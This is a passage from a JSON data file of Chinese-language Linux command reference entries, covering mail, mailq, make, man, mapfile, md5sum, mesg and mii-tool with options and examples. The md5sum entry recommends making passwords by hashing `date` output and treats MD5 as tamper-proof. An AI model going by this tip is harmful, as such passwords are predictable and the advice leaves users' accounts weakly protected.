命令)。\n=：显示当前页的信息。\n：查看当前页的源代码。\n!：回到shell提示符下。\n_：清除当前任务的所有授权信息。\n*：图形链接模式的切换开关。\n@：<span class=\"hljs-number\">8</span>位传输模式或CJK模式的切换开关。\n[：pseudo_inlines 模式的切换开关。\n]：为当前页或当前链接发送一个“head”请求。\nCtrl+r：重新装如当前页并且刷新屏幕。\nCtrl+w：刷新屏幕。\nCtrl+u：删除输入的行。\nCtrl+g：取消输入或者传送。\nCtrl+<span class=\"hljs-built_in\">t</span>：跟踪模式的切换开关。\n;：看Lynx对当前任务的跟踪记录。\nCtrl+k：调用 Cookie Jar 页。\n数字键：到后面的第 <span class=\"hljs-built_in\">n</span> 个链接。\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "mail",
        "des": "命令行下发送和接收电子邮件",
        "body": "<h1 id=\"mail\">mail</h1>\n<p>命令行下发送和接收电子邮件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mail命令</strong> 是命令行的电子邮件发送和接收工具。操作的界面不像elm或pine那么容易使用，但功能非常完整。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">mail</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b&lt;地址&gt;：指定密件副本的收信人地址；</span>\n<span class=\"hljs-deletion\">-c&lt;地址&gt;：指定副本的收信人地址；</span>\n<span class=\"hljs-deletion\">-f&lt;邮件文件&gt;：读取指定邮件文件中的邮件；</span>\n<span class=\"hljs-deletion\">-i：不显示终端发出的信息；</span>\n<span class=\"hljs-deletion\">-I：使用互动模式；</span>\n<span class=\"hljs-deletion\">-n：程序使用时，不使用mail.rc文件中的设置；</span>\n<span class=\"hljs-deletion\">-N：阅读邮件时，不显示邮件的标题；</span>\n<span class=\"hljs-deletion\">-s&lt;邮件主题&gt;：指定邮件的主题；</span>\n<span class=\"hljs-deletion\">-u&lt;用户帐号&gt;：读取指定用户的邮件；</span>\n<span class=\"hljs-deletion\">-v：执行时，显示详细的信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>邮件地址：收信人的电子邮箱地址。</p>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>直接使用shell当编辑器</strong> </p>\n<pre><code class=\"language-shell\">mail -s <span class=\"hljs-string\">\"Hello from jsdig.com by shell\"</span> <span class=\"hljs-symbol\">admin@</span>jsdig.com\nhello,<span class=\"hljs-keyword\">this</span> <span class=\"hljs-keyword\">is</span> the content of mail.\nwelcome to www.jsdig.com\n</code></pre>\n<p>第一行是输入的命令，<code>-s</code>表示邮件的主题，后面的<code>admin@jsdig.com</code>则是邮件的接收人，输入完这行命令后回车，会进入邮件正文的编写，我们可以输入任何文字，比如上面的两行。当邮件正文输入完成后，需要按 <strong>CTRL+D</strong> 结束输入，此时会提示你输入Cc地址，即邮件抄送地址，没有直接回车就完成了邮件的发送。</p>\n<p> <strong>使用管道进行邮件发送</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">echo</span> <span class=\"hljs-string\">\"hello,this is the content of mail.welcome to www.jsdig.com\"</span> | mail -s <span class=\"hljs-string\">\"Hello from jsdig.com by pipe\"</span> admin<span class=\"hljs-variable\">@jsdig</span>.com\n</code></pre>\n<p>使用管道直接敲入这行命令即可完成邮件的发送，其中echo后的是邮件正文。</p>\n<p> <strong>使用文件进行邮件发送</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">mail</span> -s <span class=\"hljs-string\">\"Hello from jsdig.com by file\"</span> admin<span class=\"hljs-variable\">@jsdig</span>.com &lt; mail.txt\n</code></pre>\n<p>使用上面的命令后，我们就可以把mail.txt文件的内容作为邮件的内容发送给<a href=\"mailto:admin@jsdig.com\">admin@jsdig.com</a>了。</p>\n<p>使用上述三种方式都可以给外部邮箱进行邮件发送，但因为前面2中都是直接在shell中敲入邮件内容，因此无法输入中文，即使我们使用粘贴的方式输入了中文，那么收到的邮件也是乱码的。但第3种方式，我们可以在window下编辑好邮件内容后，放到linux下，再进行发送，这样就可以正常发送中文了。不过目前邮件的中文标题暂时没有找到解决办法。</p>\n<p>因为mail程序本身就是调用sendmail来进行邮件发送的，因此我们可以在mail命令中使用sendmail的参数进行配置，比如我想使用特定的发件人发送邮件，可以使用如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">mail</span> -s <span class=\"hljs-string\">\"Hello from jsdig.com with sender\"</span> admin<span class=\"hljs-variable\">@jsdig</span>.com -- -f user<span class=\"hljs-variable\">@jsdig</span>.com&lt;mail.txt\n</code></pre>\n<p>上面的命令中，我们使用了– -f <a href=\"mailto:user@jsdig.com\">user@jsdig.com</a>这样的参数，这是sendmail的选项，其中-f表示邮件的发送人邮件地址。</p>\n<p>很多情况下，我们也需要使用邮件来发送附件，在linux下使用mail命令发送附件也很简单，不过首先需要安装uuencode软件包，这个程序是对二进制文件进行编码使其适合通过邮件进行发送，在CentOS上安装该软件包如下：</p>\n<pre><code class=\"language-shell\">yum <span class=\"hljs-keyword\">install</span> sharutils\n</code></pre>\n<p>安装完成后我们就可以来进行附件的发送了，使用如下命令：</p>\n<pre><code class=\"language-shell\">uuencode <span class=\"hljs-keyword\">test</span>.txt <span class=\"hljs-keyword\">test</span> | mail -s <span class=\"hljs-string\">\"hello,see the attachement\"</span> admin@jsdig.com&lt;mail.txt\n</code></pre>\n<p>完成后就可以把text.txt文件作为邮件的附件发送出去了。uuencode有两个参数，第一个是要发送的文件，第二个是显示的文件名称。</p>\n<p>这里我主要介绍的是在CentOS下使用mail发送电子邮件的一些使用方法，需要的要求是你的linux必须安装了sendmail并开启了，同时保证可以连接外网。另外，文章中提到的命令本人都经过亲自测试，保证完全可用，不过你需要将命令中的电子邮件地址换成自己的电子邮件地址。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "mailq",
        "des": "显示待发送的邮件队列",
        "body": "<h1 id=\"mailq\">mailq</h1>\n<p>显示待发送的邮件队列</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mailq命令</strong> 用户显示待发送的邮件队列，显示的每一个条目包括邮件队列id、邮件大小、加入队列时间、邮件发送者和接受者。如果邮件最后一次尝试后还没有将邮件投递出去，则显示发送失败的原因。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">mail<span class=\"hljs-string\">q(选项)</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-v：显示详细的信息。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[<span class=\"hljs-meta\">root@localhost ~</span>]<span class=\"hljs-meta\"># mailq -v</span>\n/<span class=\"hljs-keyword\">var</span>/spool/mqueue <span class=\"hljs-keyword\">is</span> empty\n                Total requests: <span class=\"hljs-number\">0</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "mailstat",
        "des": "显示到达的邮件状态",
        "body": "<h1 id=\"mailstat\">mailstat</h1>\n<p>显示到达的邮件状态</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mailstat命令</strong> 用来显示到达的邮件状态。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">mailstat</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-k：保持邮件日志文件的完整性，不清空日志文件；</span>\n<span class=\"hljs-deletion\">-l：使用长格式显示邮件状态；</span>\n<span class=\"hljs-deletion\">-m：合并任何错误信息到一行中显示；</span>\n<span class=\"hljs-deletion\">-o：使用老的邮件日志邮件；</span>\n<span class=\"hljs-deletion\">-t：使用简洁的格式显示邮件状态；</span>\n<span class=\"hljs-deletion\">-s：如果没有邮件则不输出任何信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>邮件日志文件：指定要读取邮件日志文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "make",
        "des": "GNU的工程化编译工具",
        "body": "<h1 id=\"make\">make</h1>\n<p>GNU的工程化编译工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>make命令</strong> 是GNU的工程化编译工具，用于编译众多相互关联的源代码文件，以实现工程化的管理，提高开发效率。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">make</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f：指定“makefile”文件；</span>\n<span class=\"hljs-deletion\">-i：忽略命令执行返回的出错信息；</span>\n<span class=\"hljs-deletion\">-s：沉默模式，在执行之前不输出相应的命令行信息；</span>\n<span class=\"hljs-deletion\">-r：禁止使用build-in规则；</span>\n<span class=\"hljs-deletion\">-n：非执行模式，输出所有执行命令，但并不执行；</span>\n<span class=\"hljs-deletion\">-t：更新目标文件；</span>\n<span class=\"hljs-deletion\">-q：make操作将根据目标文件是否已经更新返回\"0\"或非\"0\"的状态信息；</span>\n<span class=\"hljs-deletion\">-p：输出所有宏定义和目标文件描述；</span>\n<span class=\"hljs-deletion\">-d：Debug模式，输出有关文件和检测时间的详细信息。</span>\n</code></pre>\n<p>Linux下常用选项与Unix系统中稍有不同，下面是不同的部分：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c dir：在读取 makefile 之前改变到指定的目录dir；</span>\n<span class=\"hljs-deletion\">-I dir：当包含其他 makefile文件时，利用该选项指定搜索目录；</span>\n<span class=\"hljs-deletion\">-h：help文挡，显示所有的make选项；</span>\n<span class=\"hljs-deletion\">-w：在处理 makefile 之前和之后，都显示工作目录。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>目标：指定编译目标。</p>\n<h3 id=\"知识扩展\">知识扩展</h3>\n<p>无论是在linux 还是在Unix环境 中，make都是一个非常重要的编译命令。不管是自己进行项目开发还是安装应用软件，我们都经常要用到make或make install。利用make工具，我们可以将大型的开发项目分解成为多个更易于管理的模块，对于一个包括几百个源文件的应用程序，使用make和 makefile工具就可以简洁明快地理顺各个源文件之间纷繁复杂的相互关系。</p>\n<p>而且如此多的源文件，如果每次都要键入gcc命令进行编译的话，那对程序员 来说简直就是一场灾难。而make工具则可自动完成编译工作，并且可以只对程序员在上次编译后修改过的部分进行编译。</p>\n<p>因此，有效的利用make和 makefile工具可以大大提高项目开发的效率。同时掌握make和makefile之后，您也不会再面对着Linux下的应用软件手足无措了。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "man",
        "des": "查看Linux中的指令帮助",
        "body": "<h1 id=\"man\">man</h1>\n<p>查看Linux中的指令帮助</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>man命令</strong> 是Linux下的帮助指令，通过man指令可以查看Linux中的指令帮助、配置文件帮助和编程帮助等信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">man</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：在所有的man帮助手册中搜索；</span>\n<span class=\"hljs-deletion\">-f：等价于whatis指令，显示给定关键字的简短描述信息；</span>\n<span class=\"hljs-deletion\">-P：指定内容时使用分页程序；</span>\n<span class=\"hljs-deletion\">-M：指定man手册搜索的路径。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  数字：指定从哪本man手册中搜索帮助；</li>\n<li>  关键字：指定要搜索帮助的关键字。</li>\n</ul>\n<h3 id=\"数字代表内容\">数字代表内容</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-number\">1</span>：用户在shell环境可操作的命令或执行文件；\n<span class=\"hljs-number\">2</span>：系统内核可调用的函数与工具等\n<span class=\"hljs-number\">3</span>：一些常用的函数(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>)与函数库<span class=\"hljs-params\">(<span class=\"hljs-keyword\">library</span>)</span>，大部分为<span class=\"hljs-title\">C</span>的函数库<span class=\"hljs-params\">(libc)</span>\n4：设备文件说明，通常在/<span class=\"hljs-title\">dev</span>下的文件\n5：配置文件或某些文件格式\n6：游戏<span class=\"hljs-params\">(games)</span>\n7：惯例与协议等，如<span class=\"hljs-title\">Linux</span>文件系统，网络协议，<span class=\"hljs-title\">ASCII</span> <span class=\"hljs-title\">code</span>等说明\n8：系统管理员可用的管理命令\n9：跟<span class=\"hljs-title\">kernel</span>有关的文件</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>我们输入<code>man ls</code>，它会在最左上角显示“LS（1）”，在这里，“LS”表示手册名称，而“（1）”表示该手册位于第一节章，同样，我们输<code>man ifconfig</code>它会在最左上角显示“IFCONFIG（8）”。也可以这样输入命令：“man [章节号] 手册名称”。</p>\n<p>man是按照手册的章节号的顺序进行搜索的，比如：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">man</span> <span class=\"hljs-built_in\">sleep</span>\n</code></pre>\n<p>只会显示sleep命令的手册,如果想查看库函数sleep，就要输入:</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">man</span> <span class=\"hljs-number\">3</span> <span class=\"hljs-built_in\">sleep</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "mapfile",
        "des": "从标准输入读取行并赋值到数组。",
        "body": "<h1 id=\"mapfile\">mapfile</h1>\n<p>从标准输入读取行并赋值到数组。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">mapfile <span class=\"hljs-selector-attr\">[-d delim]</span> <span class=\"hljs-selector-attr\">[-n count]</span> <span class=\"hljs-selector-attr\">[-O origin]</span> <span class=\"hljs-selector-attr\">[-s count]</span> <span class=\"hljs-selector-attr\">[-t]</span> <span class=\"hljs-selector-attr\">[-u fd]</span> <span class=\"hljs-selector-attr\">[-C callback]</span> <span class=\"hljs-selector-attr\">[-c quantum]</span> <span class=\"hljs-selector-attr\">[array]</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>从标准输入或文件描述符读取行并赋值到数组。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d delim       将delim设为行分隔符，代替默认的换行符。</span>\n<span class=\"hljs-deletion\">-n count       从标准输入中获取最多count行，如果count为零那么获取全部。</span>\n<span class=\"hljs-deletion\">-O origin      从数组下标为origin的位置开始赋值，默认的下标为0。</span>\n<span class=\"hljs-deletion\">-s count       跳过对前count行的读取。</span>\n<span class=\"hljs-deletion\">-t             读取时移除行分隔符delim（默认为换行符）。</span>\n<span class=\"hljs-deletion\">-u fd          从文件描述符fd中读取。</span>\n<span class=\"hljs-deletion\">-C callback    每当读取了quantum行时，调用callback语句。</span>\n<span class=\"hljs-deletion\">-c quantum     设定读取的行数为quantum。</span>\n\n如果使用-C时没有同时使用-c指定quantum的值，那么quantum默认为5000。\n当callback语句执行时，将数组下一个要赋值的下标以及读取的行作为额外的参数传递给callback语句。\n如果使用-O时没有提供起始位置，那么mapfile会在实际赋值之前清空该数组。\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>array（可选）：用于输出的数组名称。如果没有指定数组名称，那么会默认写入到变量名为MAPFILE的数组中。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回成功除非使用了非法选项、指定的数组是只读的、指定的数组不是下标数组。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 常见的读取形式。</span>\n<span class=\"hljs-built_in\">mapfile</span> &lt; source_file target_array\ncat source_file |<span class=\"hljs-built_in\">mapfile</span> target_array\n<span class=\"hljs-built_in\">mapfile</span> -u fd target_array\n\n<span class=\"hljs-comment\"># 只读取前5行。</span>\n<span class=\"hljs-built_in\">mapfile</span> &lt; source_file -n 5 target_array\n\n<span class=\"hljs-comment\"># 跳过前5行。</span>\n<span class=\"hljs-built_in\">mapfile</span> &lt; source_file -s 5 target_array\n\n<span class=\"hljs-comment\"># 在数组指定的下标开始赋值。</span>\n<span class=\"hljs-comment\"># 请注意：这样做不会清空该数组。</span>\n<span class=\"hljs-built_in\">mapfile</span> &lt; source_file -O 2 target_array\n\n<span class=\"hljs-comment\"># 读取时设定行分隔符为tab。</span>\n<span class=\"hljs-comment\"># 注意，第二行的tab在终端需要用ctrl+v tab输入；</span>\n<span class=\"hljs-built_in\">mapfile</span> &lt; source_file -d $<span class=\"hljs-string\">'\\t'</span> target_array\n<span class=\"hljs-built_in\">mapfile</span> &lt; source_file -d <span class=\"hljs-string\">'    '</span> target_array\n\n<span class=\"hljs-comment\"># 读取时移除行分隔符（tab）。</span>\n<span class=\"hljs-built_in\">mapfile</span> &lt; source_file -d $<span class=\"hljs-string\">'\\t'</span> -t target_array\n<span class=\"hljs-comment\"># 读取时移除行分隔符（换行符）。</span>\n<span class=\"hljs-built_in\">mapfile</span> &lt; source_file -t target_array\n\n<span class=\"hljs-comment\"># 每读取2行，执行一次语句（在这里是echo）。</span>\n<span class=\"hljs-built_in\">mapfile</span> &lt; source_file -C <span class=\"hljs-string\">\"echo CALLBACK:\"</span> -c 2 target_array\n\n<span class=\"hljs-comment\"># 遍历下标，依次显示数组的元素。</span>\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-variable\">${!target_array[@]}</span>; <span class=\"hljs-keyword\">do</span>\n  <span class=\"hljs-built_in\">printf</span> <span class=\"hljs-string\">\"%s\"</span> <span class=\"hljs-variable\">${target_array[i]}</span>\n<span class=\"hljs-keyword\">done</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n<li>bash内建命令readarray是mapfile的同义词。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "md5sum",
        "des": "计算和校验文件报文摘要的工具程序",
        "body": "<h1 id=\"md5sum\">md5sum</h1>\n<p>计算和校验文件报文摘要的工具程序</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>md5sum命令</strong> 采用MD5报文摘要算法（128位）计算和检查文件的校验和。一般来说，安装了Linux后，就会有md5sum这个工具，直接在命令行终端直接运行。</p>\n<p>MD5算法常常被用来验证网络文件传输的完整性，防止文件被人篡改。MD5 全称是报文摘要算法（Message-Digest Algorithm 5），此算法对任意长度的信息逐位进行计算，产生一个二进制长度为128位（十六进制长度就是32位）的“指纹”（或称“报文摘要”），不同的文件产生相同的报文摘要的可能性是非常非常之小的。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">md5sum</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b：二进制模式读取文件；</span>\n<span class=\"hljs-deletion\">-t或--text：把输入的文件作为文本文件看待；</span>\n<span class=\"hljs-deletion\">-c：从指定文件中读取MD5校验和，并进行校验；</span>\n<span class=\"hljs-deletion\">--status：验证成功时不输出任何信息；</span>\n<span class=\"hljs-deletion\">-w：当校验不正确时给出警告信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定保存着文件名和校验和的文本文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p><strong>使用 md5sum 生成密码</strong></p>\n<p>另一种获取可用作密码的随机字符串的方法是计算 MD5 校验值！校验值看起来确实像是随机字符串组合在一起，我们可以用作密码。确保你的计算源是个变量，这样的话每次运行命令时生成的校验值都不一样。比如 date ！date 命令 总会生成不同的输出。</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># date | md5sum</span>\n<span class=\"hljs-number\">6</span>a43f2c246cdc3e6a3592652f831d186  -\n</code></pre>\n<p><strong>生成一个文件insert.sql的md5值：</strong> </p>\n<pre><code class=\"language-shell\">[root@localhost ~]# md5sum <span class=\"hljs-keyword\">insert</span>.<span class=\"hljs-keyword\">sql</span>\nbcda6cb5c704664f989703ac5a88f112  <span class=\"hljs-keyword\">insert</span>.<span class=\"hljs-keyword\">sql</span>\n</code></pre>\n<p><strong>检查文件testfile是否被修改过：</strong> </p>\n<p>首先生成md5文件：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">md5sum</span> testfile &gt; testfile.md5\n</code></pre>\n<p>检查：</p>\n<pre><code class=\"language-shell\">md<span class=\"hljs-number\">5</span>sum testfile -<span class=\"hljs-keyword\">c</span> testfile.md<span class=\"hljs-number\">5</span>\n</code></pre>\n<p>如果文件没有变化，输出应该如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">forsort:</span> OK\n</code></pre>\n<p>此时，md5sum命令返回0。</p>\n<p>如果文件发生了变化，输出应该如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">forsort</span>: FAILED\n<span class=\"hljs-attribute\">md5sum</span>: WARNING: <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> computed checksum did NOT match\n</code></pre>\n<p>此时，md5sum命令返回非0。</p>\n<p>这里，检查用的文件名随意。如果不想有任何输出，则<code>md5sum testfile --status -c testfile.md5</code>，这时候通过返回值来检测结果。</p>\n<p>检测的时候如果检测文件非法则输出信息的选项:</p>\n<pre><code class=\"language-shell\">md<span class=\"hljs-number\">5</span>sum -w -<span class=\"hljs-keyword\">c</span> testfile.md<span class=\"hljs-number\">5</span>\n</code></pre>\n<p>输出之后，文件异常输出类似如下：</p>\n<pre><code class=\"language-shell\">md5sum: testfile.md5: 1: improperly formatted MD5 <span class=\"hljs-keyword\">checksum</span> <span class=\"hljs-keyword\">line</span>\nmd5sum: testfile.md5: <span class=\"hljs-keyword\">no</span> properly formatted MD5 <span class=\"hljs-keyword\">checksum</span> lines found\n</code></pre>\n<p>这里，testfile.md5只有一行信息，但是我认为地给它多加了一个字符，导致非法。如果md5文件正常那么<code>-w</code>有没有都一样。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "mesg",
        "des": "设置当前终端的写权限",
        "body": "<h1 id=\"mesg\">mesg</h1>\n<p>设置当前终端的写权限</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mesg命令</strong> 用于设置当前终端的写权限，即是否让其他用户向本终端发信息。将mesg设置y时，其他用户可利用write命令将信息直接显示在您的屏幕上。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">mesg</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>y/n：y表示运行向当前终端写信息，n表示禁止向当前终端写信息。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># mesg y    #允许系统用户将信息直接显示在你的屏幕上。</span>\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># mesg n    #不允许系统用户将信息直接显示在你的屏幕上。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "mii-tool",
        "des": "配置网络设备协商方式的工具",
        "body": "<h1 id=\"mii-tool\">mii-tool</h1>\n<p>配置网络设备协商方式的工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mii-tool命令</strong> 是用于查看、管理介质的网络接口的状态，有时网卡需要配置协商方式，比如10/100/1000M的网卡半双工、全双工、自动协商的配置。但大多数的网络设备是不用我们来修改协商，因为大多数网络设置接入的时候，都采用自动协商来解决相互通信的问题。不过自动协商也不是万能的，有时也会出现错误，比如丢包率比较高，这时就要我们来指定网卡的协商方式。mii-tool就是能指定网卡的协商方式。下面我们说一说mii-tool的用法。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">usage: mii-tool <span class=\"hljs-comment\">[-VvRrwl]</span> <span class=\"hljs-comment\">[-A media,... | -F media]</span> <span class=\"hljs-comment\">[interface ...]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>V 显示版本信息；\n<span class=\"hljs-literal\">-</span>v 显示网络接口的信息；\n<span class=\"hljs-literal\">-</span>R 重设MII到开启状态；\n<span class=\"hljs-literal\">-</span>r 重启自动协商模式；\n<span class=\"hljs-literal\">-</span>w 查看网络接口连接的状态变化；\n<span class=\"hljs-literal\">-</span>l 写入事件到系统日志；\n<span class=\"hljs-literal\">-</span>A 指令特定的网络接口；\n<span class=\"hljs-literal\">-</span>F 更改网络接口协商方式；\n\n<span class=\"hljs-attribute\">media</span>: 100baseT4, 100baseTx-FD, 100baseTx-HD, 10baseT-FD, 10baseT-HD,\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (to advertise both HD and FD) 100baseTx, 10baseT\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>查看网络接口的协商状态：</p>\n<pre><code class=\"language-shell\">[<span class=\"hljs-type\">root</span>@<span class=\"hljs-type\">localhost</span> ~]<span class=\"hljs-comment\"># mii-tool -v eth0</span>\neth0: negotiated <span class=\"hljs-number\">100</span>baseTx<span class=\"hljs-literal\">-FD</span>, link ok\n&nbsp; product info: vendor <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:ef, model <span class=\"hljs-number\">60</span> rev <span class=\"hljs-number\">8</span>\n&nbsp; basic mode:&nbsp;&nbsp; autonegotiation enabled\n&nbsp; basic status: autonegotiation complete, link ok\n&nbsp; capabilities: <span class=\"hljs-number\">100</span>baseTx<span class=\"hljs-literal\">-FD</span> <span class=\"hljs-number\">100</span>baseTx<span class=\"hljs-literal\">-HD</span> <span class=\"hljs-number\">10</span>ba<span class=\"hljs-built_in\">seT-FD</span> <span class=\"hljs-number\">10</span>ba<span class=\"hljs-built_in\">seT-HD</span>\n&nbsp; advertising:&nbsp; <span class=\"hljs-number\">100</span>baseTx<span class=\"hljs-literal\">-FD</span> <span class=\"hljs-number\">100</span>baseTx<span class=\"hljs-literal\">-HD</span> <span class=\"hljs-number\">10</span>ba<span class=\"hljs-built_in\">seT-FD</span> <span class=\"hljs-number\">10</span>ba<span class=\"hljs-built_in\">seT-HD</span> flow<span class=\"hljs-literal\">-control</span>\n&nbsp; link partner: <span class=\"hljs-number\">100</span>baseTx<span class=\"hljs-literal\">-FD</span> <span class=\"hljs-number\">100</span>baseTx<span class=\"hljs-literal\">-HD</span> <span class=\"hljs-number\">10</span>ba<span class=\"hljs-built_in\">seT-FD</span> <span class=\"hljs-number\">10</span>ba<span class=\"hljs-built_in\">seT-HD</span>\n</code></pre>\n<p>注：上面的例子，我们可以看得到是自动协商，注意红字的部份。</p>\n<p>更改网络接口协商方式：</p>\n<p>更改网络接口的协商方式，我们要用到<code>-F</code>选项，后面可以接100baseT4, 100baseTx-FD, 100baseTx-HD, 10baseT-FD, 10baseT-HD等参数；</p>\n<p>如果我们想把网络接口eth0改为1000Mb/s全双工的模式应该怎么办呢？</p>\n<pre><code class=\"language-shell\">[<span class=\"hljs-string\">root@localhost</span> <span class=\"hljs-string\">~</span>]<span class=\"hljs-comment\"># mii-tool -F 100baseTx-FD</span>\n[<span class=\"hljs-string\">root@localhost</span> <span class=\"hljs-string\">~</span>]<span class=\"hljs-comment\"># mii-tool -v eth0</span>\n<span class=\"hljs-attr\">eth0:</span> <span class=\"hljs-number\">100</span> <span class=\"hljs-string\">Mbit,</span> <span class=\"hljs-string\">full</span> <span class=\"hljs-string\">duplex,</span> <span class=\"hljs-string\">link</span> <span class=\"hljs-string\">ok</span>\n  <span class=\"hljs-attr\">product info:</span> <span class=\"hljs-string\">vendor</span> <span class=\"hljs-number\">00</span><span class=\"hljs-string\">:00:00,</span> <span class=\"hljs-string\">model</span> <span class=\"hljs-number\">0</span> <span class=\"hljs-string\">rev</span> <span class=\"hljs-number\">0</span>\n  <span class=\"hljs-attr\">basic mode:</span>   <span class=\"hljs-number\">100</span> <span class=\"hljs-string\">Mbit,</span> <span class=\"hljs-string\">full</span> <span class=\"hljs-string\">duplex</span>\n  <span class=\"hljs-attr\">basic status:</span> <span class=\"hljs-string\">link</span> <span class=\"hljs-string\">ok</span>\n  <span class=\"hljs-attr\">capabilities:</span> <span class=\"hljs-string\">100baseTx-FD</span> <span class=\"hljs-string\">100baseTx-HD</span> <span class=\"hljs-string\">10baseT-FD</span> <span class=\"hljs-string\">10baseT-HD</span>\n  <span class=\"hljs-attr\">advertising:</span>  <span class=\"hljs-string\">100baseTx-FD</span> <span 